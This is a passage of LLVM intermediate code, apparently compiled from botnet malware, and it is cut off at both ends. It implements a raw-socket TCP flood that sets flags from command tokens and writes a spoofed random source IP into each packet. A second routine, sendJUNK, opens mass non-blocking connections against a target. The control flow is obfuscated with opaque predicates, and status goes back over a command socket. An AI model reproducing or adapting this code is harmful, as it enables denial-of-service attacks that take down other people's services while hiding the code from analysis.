  %176 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %175, i32 0, i32 0
  %177 = bitcast %union.anon.0* %176 to %struct.anon.1*
  %178 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %177, i32 0, i32 4
  %179 = load i16, i16* %178, align 4
  %180 = and i16 %179, -1025
  %181 = or i16 %180, 1024
  store i16 %181, i16* %178, align 4
  %182 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %182, i32 0, i32 0
  %184 = bitcast %union.anon.0* %183 to %struct.anon.1*
  %185 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %184, i32 0, i32 4
  %186 = load i16, i16* %185, align 4
  %187 = and i16 %186, -257
  %188 = or i16 %187, 256
  store i16 %188, i16* %185, align 4
  %189 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %190 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %189, i32 0, i32 0
  %191 = bitcast %union.anon.0* %190 to %struct.anon.1*
  %192 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %191, i32 0, i32 4
  %193 = load i16, i16* %192, align 4
  %194 = and i16 %193, -4097
  %195 = or i16 %194, 4096
  store i16 %195, i16* %192, align 4
  %196 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon.0* %197 to %struct.anon.1*
  %199 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -2049
  %202 = or i16 %201, 2048
  store i16 %202, i16* %199, align 4
  br label %328

; <label>:203:                                    ; preds = %120
  %204 = load i8*, i8** %12, align 8
  %205 = call i8* @strtok(i8* %204, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %205, i8** %23, align 8
  br label %206

; <label>:206:                                    ; preds = %325, %203
  %207 = load i8*, i8** %23, align 8
  %208 = icmp ne i8* %207, null
  br i1 %208, label %209, label %327

; <label>:209:                                    ; preds = %206
  %210 = load i32, i32* @x.67
  %211 = load i32, i32* @y.68
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %209
  %218 = load i8*, i8** %23, align 8
  %219 = call i32 @strcmp(i8* %218, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.37, i32 0, i32 0)) #10
  %220 = icmp ne i32 %219, 0
  %221 = load i32, i32* @x.67
  %222 = load i32, i32* @y.68
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %220, label %237, label %229

; <label>:229:                                    ; preds = %originalBBpart212
  %230 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 0
  %232 = bitcast %union.anon.0* %231 to %struct.anon.1*
  %233 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %232, i32 0, i32 4
  %234 = load i16, i16* %233, align 4
  %235 = and i16 %234, -513
  %236 = or i16 %235, 512
  store i16 %236, i16* %233, align 4
  br label %325

; <label>:237:                                    ; preds = %originalBBpart212
  %238 = load i8*, i8** %23, align 8
  %239 = call i32 @strcmp(i8* %238, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.38, i32 0, i32 0)) #10
  %240 = icmp ne i32 %239, 0
  br i1 %240, label %249, label %241

; <label>:241:                                    ; preds = %237
  %242 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 0
  %244 = bitcast %union.anon.0* %243 to %struct.anon.1*
  %245 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %246, -1025
  %248 = or i16 %247, 1024
  store i16 %248, i16* %245, align 4
  br label %308

; <label>:249:                                    ; preds = %237
  %250 = load i8*, i8** %23, align 8
  %251 = call i32 @strcmp(i8* %250, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %252 = icmp ne i32 %251, 0
  br i1 %252, label %261, label %253

; <label>:253:                                    ; preds = %249
  %254 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 0
  %256 = bitcast %union.anon.0* %255 to %struct.anon.1*
  %257 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %256, i32 0, i32 4
  %258 = load i16, i16* %257, align 4
  %259 = and i16 %258, -257
  %260 = or i16 %259, 256
  store i16 %260, i16* %257, align 4
  br label %307

; <label>:261:                                    ; preds = %249
  %262 = load i8*, i8** %23, align 8
  %263 = call i32 @strcmp(i8* %262, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.40, i32 0, i32 0)) #10
  %264 = icmp ne i32 %263, 0
  br i1 %264, label %273, label %265

; <label>:265:                                    ; preds = %261
  %266 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon.0* %267 to %struct.anon.1*
  %269 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %268, i32 0, i32 4
  %270 = load i16, i16* %269, align 4
  %271 = and i16 %270, -4097
  %272 = or i16 %271, 4096
  store i16 %272, i16* %269, align 4
  br label %290

; <label>:273:                                    ; preds = %261
  %274 = load i8*, i8** %23, align 8
  %275 = call i32 @strcmp(i8* %274, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.41, i32 0, i32 0)) #10
  %276 = icmp ne i32 %275, 0
  br i1 %276, label %285, label %277

; <label>:277:                                    ; preds = %273
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.0* %279 to %struct.anon.1*
  %281 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %280, i32 0, i32 4
  %282 = load i16, i16* %281, align 4
  %283 = and i16 %282, -2049
  %284 = or i16 %283, 2048
  store i16 %284, i16* %281, align 4
  br label %289

; <label>:285:                                    ; preds = %273
  %286 = load i32, i32* @mainCommSock, align 4
  %287 = load i8*, i8** %23, align 8
  %288 = call i32 (i32, i8*, ...) @sockprintf(i32 %286, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.42, i32 0, i32 0), i8* %287)
  br label %289

; <label>:289:                                    ; preds = %285, %277
  br label %290

; <label>:290:                                    ; preds = %289, %265
  %291 = load i32, i32* @x.67
  %292 = load i32, i32* @y.68
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %290
  %299 = load i32, i32* @x.67
  %300 = load i32, i32* @y.68
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %307

; <label>:307:                                    ; preds = %originalBBpart216, %253
  br label %308

; <label>:308:                                    ; preds = %307, %241
  %309 = load i32, i32* @x.67
  %310 = load i32, i32* @y.68
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %308
  %317 = load i32, i32* @x.67
  %318 = load i32, i32* @y.68
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %325

; <label>:325:                                    ; preds = %originalBBpart220, %229
  %326 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %326, i8** %23, align 8
  br label %206

; <label>:327:                                    ; preds = %206
  br label %328

; <label>:328:                                    ; preds = %327, %167
  %329 = call i32 @rand_cmwc()
  %330 = trunc i32 %329 to i16
  %331 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %332 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %331, i32 0, i32 0
  %333 = bitcast %union.anon.0* %332 to %struct.anon.1*
  %334 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %333, i32 0, i32 5
  store i16 %330, i16* %334, align 2
  %335 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %336 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %335, i32 0, i32 0
  %337 = bitcast %union.anon.0* %336 to %struct.anon.1*
  %338 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %337, i32 0, i32 6
  store i16 0, i16* %338, align 4
  %339 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %340 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %339, i32 0, i32 0
  %341 = bitcast %union.anon.0* %340 to %struct.anon.1*
  %342 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %341, i32 0, i32 7
  store i16 0, i16* %342, align 2
  %343 = load i32, i32* %9, align 4
  %344 = icmp eq i32 %343, 0
  br i1 %344, label %345, label %363

; <label>:345:                                    ; preds = %328
  %346 = load i32, i32* @x.67
  %347 = load i32, i32* @y.68
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %345
  %354 = call i32 @rand_cmwc()
  %355 = load i32, i32* @x.67
  %356 = load i32, i32* @y.68
  %357 = sub i32 %355, 1
  %358 = mul i32 %355, %357
  %359 = urem i32 %358, 2
  %360 = icmp eq i32 %359, 0
  %361 = icmp slt i32 %356, 10
  %362 = or i1 %360, %361
  br i1 %362, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %368

; <label>:363:                                    ; preds = %328
  %364 = load i32, i32* %9, align 4
  %365 = trunc i32 %364 to i16
  %366 = call zeroext i16 @htons(i16 zeroext %365) #13
  %367 = zext i16 %366 to i32
  br label %368

; <label>:368:                                    ; preds = %363, %originalBBpart224
  %369 = phi i32 [ %354, %originalBBpart224 ], [ %367, %363 ]
  %370 = trunc i32 %369 to i16
  %371 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 0
  %373 = bitcast %union.anon.0* %372 to %struct.anon.1*
  %374 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %373, i32 0, i32 1
  store i16 %370, i16* %374, align 2
  %375 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %376 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %377 = call zeroext i16 @tcpcsum(%struct.iphdr* %375, %struct.tcphdr* %376)
  %378 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %379 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %378, i32 0, i32 0
  %380 = bitcast %union.anon.0* %379 to %struct.anon.1*
  %381 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %380, i32 0, i32 6
  store i16 %377, i16* %381, align 4
  %382 = bitcast i8* %125 to i16*
  %383 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i32 0, i32 2
  %385 = load i16, i16* %384, align 2
  %386 = zext i16 %385 to i32
  %387 = call zeroext i16 @csum(i16* %382, i32 %386)
  %388 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %389 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %388, i32 0, i32 7
  store i16 %387, i16* %389, align 2
  %390 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %391 = load i32, i32* %10, align 4
  %392 = add nsw i32 %390, %391
  store i32 %392, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %393

; <label>:393:                                    ; preds = %494, %originalBBpart236, %368
  %394 = load i32, i32* @x.67
  %395 = load i32, i32* @y.68
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %393
  %402 = load i32, i32* @x.67
  %403 = load i32, i32* @y.68
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %410

; <label>:410:                                    ; preds = %originalBBpart228
  %411 = load i32, i32* %17, align 4
  %412 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %413 = call i64 @sendto(i32 %411, i8* %125, i64 %123, i32 0, %struct.sockaddr* %412, i32 16)
  %414 = load i32, i32* %19, align 4
  %415 = call i32 @getRandomIP(i32 %414)
  %416 = call i32 @htonl(i32 %415) #13
  %417 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %418 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %417, i32 0, i32 8
  store i32 %416, i32* %418, align 4
  %419 = call i32 @rand_cmwc()
  %420 = trunc i32 %419 to i16
  %421 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 3
  store i16 %420, i16* %422, align 4
  %423 = call i32 @rand_cmwc()
  %424 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 0
  %426 = bitcast %union.anon.0* %425 to %struct.anon.1*
  %427 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %426, i32 0, i32 2
  store i32 %423, i32* %427, align 4
  %428 = call i32 @rand_cmwc()
  %429 = trunc i32 %428 to i16
  %430 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %431 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %430, i32 0, i32 0
  %432 = bitcast %union.anon.0* %431 to %struct.anon.1*
  %433 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %432, i32 0, i32 0
  store i16 %429, i16* %433, align 4
  %434 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %435 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %434, i32 0, i32 0
  %436 = bitcast %union.anon.0* %435 to %struct.anon.1*
  %437 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %436, i32 0, i32 6
  store i16 0, i16* %437, align 4
  %438 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %439 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %440 = call zeroext i16 @tcpcsum(%struct.iphdr* %438, %struct.tcphdr* %439)
  %441 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %442 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %441, i32 0, i32 0
  %443 = bitcast %union.anon.0* %442 to %struct.anon.1*
  %444 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %443, i32 0, i32 6
  store i16 %440, i16* %444, align 4
  %445 = bitcast i8* %125 to i16*
  %446 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %447 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %446, i32 0, i32 2
  %448 = load i16, i16* %447, align 2
  %449 = zext i16 %448 to i32
  %450 = call zeroext i16 @csum(i16* %445, i32 %449)
  %451 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %452 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %451, i32 0, i32 7
  store i16 %450, i16* %452, align 2
  %453 = load i32, i32* %25, align 4
  %454 = load i32, i32* %15, align 4
  %455 = icmp eq i32 %453, %454
  br i1 %455, label %456, label %494

; <label>:456:                                    ; preds = %410
  %457 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %458 = load i32, i32* %24, align 4
  %459 = icmp sgt i32 %457, %458
  br i1 %459, label %460, label %477

; <label>:460:                                    ; preds = %456
  %461 = load i32, i32* @x.67
  %462 = load i32, i32* @y.68
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %460
  %469 = load i32, i32* @x.67
  %470 = load i32, i32* @y.68
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %497

; <label>:477:                                    ; preds = %456
  %478 = load i32, i32* @x.67
  %479 = load i32, i32* @y.68
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %477
  store i32 0, i32* %25, align 4
  %486 = load i32, i32* @x.67
  %487 = load i32, i32* @y.68
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %393

; <label>:494:                                    ; preds = %410
  %495 = load i32, i32* %25, align 4
  %496 = add i32 %495, 1
  store i32 %496, i32* %25, align 4
  br label %393

; <label>:497:                                    ; preds = %originalBBpart232
  %498 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %498)
  br label %499

; <label>:499:                                    ; preds = %497, %91, %originalBBpart24, %originalBBpart2
  %500 = load i32, i32* @x.67
  %501 = load i32, i32* @y.68
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %499
  %508 = load i32, i32* @x.67
  %509 = load i32, i32* @y.68
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %44
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %67
  %516 = load i32, i32* @mainCommSock, align 4
  %517 = call i32 (i32, i8*, ...) @sockprintf(i32 %516, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.33, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %94
  %518 = load i32, i32* %11, align 4
  %519 = icmp eq i32 %518, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %209
  %520 = load i8*, i8** %23, align 8
  %521 = call i32 @strcmp(i8* %520, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.37, i32 0, i32 0)) #10
  %522 = icmp ne i32 %521, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %290
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %308
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %345
  %523 = call i32 @rand_cmwc()
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %393
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %460
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %477
  store i32 0, i32* %25, align 4
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %499
  br label %originalBB38
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #2
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %3
  br label %386

; <label>:32:                                     ; preds = %3
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %34 = getelementptr inbounds [8 x i8], [8 x i8]* %33, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 8, i32 4, i1 false)
  %35 = load i32, i32* %7, align 4
  %36 = zext i32 %35 to i64
  %37 = call i8* @llvm.stacksave()
  store i8* %37, i8** %10, align 8
  %38 = alloca %struct.state_t, i64 %36, align 16
  %39 = bitcast %struct.state_t* %38 to i8*
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = mul i64 %41, 5
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 %42, i32 16, i1 false)
  %43 = call noalias i8* @malloc(i64 1024) #2
  store i8* %43, i8** %16, align 8
  %44 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = load i32, i32* %6, align 4
  %47 = add nsw i32 %45, %46
  store i32 %47, i32* %17, align 4
  br label %48

; <label>:48:                                     ; preds = %383, %32
  %49 = load i32, i32* %17, align 4
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = icmp sgt i32 %49, %50
  br i1 %51, label %52, label %384

; <label>:52:                                     ; preds = %48
  store i32 0, i32* %8, align 4
  br label %53

; <label>:53:                                     ; preds = %380, %52
  %54 = load i32, i32* %8, align 4
  %55 = load i32, i32* %7, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %383

; <label>:57:                                     ; preds = %53
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %59
  %61 = getelementptr inbounds %struct.state_t, %struct.state_t* %60, i32 0, i32 1
  %62 = load i8, i8* %61, align 4
  %63 = zext i8 %62 to i32
  switch i32 %63, label %363 [
    i32 0, label %64
    i32 1, label %156
    i32 2, label %321
  ]

; <label>:64:                                     ; preds = %57
  %65 = load i32, i32* @x.69
  %66 = load i32, i32* @y.70
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %64
  %73 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %74 = load i32, i32* %8, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %75
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %76, i32 0, i32 0
  store i32 %73, i32* %77, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %79
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 8
  %83 = load i32, i32* %8, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %84
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 8
  %88 = call i32 (i32, i32, ...) @fcntl(i32 %87, i32 3, i8* null)
  %89 = or i32 %88, 2048
  %90 = call i32 (i32, i32, ...) @fcntl(i32 %82, i32 4, i32 %89)
  %91 = load i32, i32* %8, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %92
  %94 = getelementptr inbounds %struct.state_t, %struct.state_t* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 8
  %96 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %97 = call i32 @connect(i32 %95, %struct.sockaddr* %96, i32 16)
  %98 = icmp ne i32 %97, -1
  %99 = load i32, i32* @x.69
  %100 = load i32, i32* @y.70
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %98, label %111, label %107

; <label>:107:                                    ; preds = %originalBBpart2
  %108 = call i32* @__errno_location() #13
  %109 = load i32, i32* %108, align 4
  %110 = icmp ne i32 %109, 115
  br i1 %110, label %111, label %134

; <label>:111:                                    ; preds = %107, %originalBBpart2
  %112 = load i32, i32* @x.69
  %113 = load i32, i32* @y.70
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %111
  %120 = load i32, i32* %8, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %121
  %123 = getelementptr inbounds %struct.state_t, %struct.state_t* %122, i32 0, i32 0
  %124 = load i32, i32* %123, align 8
  %125 = call i32 @close(i32 %124)
  %126 = load i32, i32* @x.69
  %127 = load i32, i32* @y.70
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %139

; <label>:134:                                    ; preds = %107
  %135 = load i32, i32* %8, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %136
  %138 = getelementptr inbounds %struct.state_t, %struct.state_t* %137, i32 0, i32 1
  store i8 1, i8* %138, align 4
  br label %139

; <label>:139:                                    ; preds = %134, %originalBBpart24
  %140 = load i32, i32* @x.69
  %141 = load i32, i32* @y.70
